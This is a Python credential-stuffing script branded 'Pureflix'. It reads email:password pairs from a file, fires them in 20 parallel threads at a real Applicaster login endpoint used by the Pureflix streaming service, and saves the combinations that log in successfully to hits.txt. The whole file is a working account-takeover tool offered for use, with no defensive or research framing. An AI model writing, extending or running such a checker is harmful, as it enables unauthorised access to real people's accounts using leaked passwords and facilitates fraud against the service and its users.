import requests
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed
import colorama
from colorama import Fore
import threading





print(f""" {Fore.BLUE}
_________                      _____.__  .__        
\______   \__ _________   _____/ ____\  | |__|__  ___
 |     ___/  |  \_  __ \_/ __ \   __\|  | |  \  \/  /
 |    |   |  |  /|  | \/\  ___/|  |  |  |_|  |>    < 
 |____|   |____/ |__|    \___  >__|  |____/__/__/\_ \
                             \/                    \/                                                     
""")







def pureflix_checker(session, email, password, hits_file, lock):
    url = 'https://login-flow.applicaster.com/auth/password/_3e74de5a-9ed4-4b6f-834a-4a7d7e2d752a_1ba339c9-b46b-4d04-91c2-d9a2a8c0ab25_undefined_undefined/login?flowType=password&_data=routes%2Fauth%2F%24flowType%2F%24uuid%2Flogin'

    payload = {
        'email': email,
        'password': password
    }

    try:
        r = session.post(url, data=payload, timeout=5)
        if r.status_code == 200:
            with lock:
                hits_file.write(f"{email}:{password}\n")
            return f"{email}:{password}"
        else:
            return None
    except requests.RequestException:
        return None

def main():
    session = requests.Session()

    accounts = []
    with open('accounts.txt', 'r') as file:
        for line in file:
            line = line.strip()
            if ':' in line:
                email, password = line.split(':')
                accounts.append((email.strip(), password.strip()))

    total_accounts = len(accounts)
    valid_count = 0
    invalid_count = 0

    lock = threading.Lock()

    def print_progress():
        print(f"\rVerificando cuentas... {valid_count} válidas | {invalid_count} inválidas | Progreso: {valid_count + invalid_count}/{total_accounts}", end="", flush=True)

    with open('hits.txt', 'w') as hits_file:
        with ThreadPoolExecutor(max_workers=20) as executor:
            futures = []
            for email, password in accounts:
                future = executor.submit(pureflix_checker, session, email, password, hits_file, lock)
                future.add_done_callback(lambda _: print_progress())
                futures.append(future)

            for future in as_completed(futures):
                result = future.result()
                if result:
                    valid_count += 1
                else:
                    invalid_count += 1

            print_progress()
            print("\n\nVerificación completada.")

    print(f"Total cuentas válidas: {valid_count}")
    print(f"Total cuentas no válidas: {invalid_count}")
    enter = input('Press enter to exit....')

if __name__ == "__main__":
    main()